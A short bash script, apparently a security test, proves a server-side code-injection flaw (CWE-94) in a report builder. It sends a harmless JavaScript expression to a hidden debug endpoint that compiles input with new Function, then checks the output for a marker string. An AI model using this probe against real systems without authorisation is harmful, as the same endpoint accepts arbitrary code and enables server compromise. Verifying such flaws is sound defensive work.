#!/usr/bin/env bash
# CODEINJ-001 (CWE-94): the report builder compiles the caller's "computed
# column" with new Function and runs it server-side. The endpoint is referenced
# only from the lazily-loaded devtools chunk.
set -e; . "$(dirname "$0")/_lib.sh"
OUT=$(curl -s -X POST "$TARGET/api/_debug/report" -H 'content-type: application/json' \
  -d '{"expr":"[\"CODEINJ\",\"PROVEN\",6*7].join(\"-\")"}')
echo "$OUT" | grep -q 'CODEINJ-PROVEN-42'
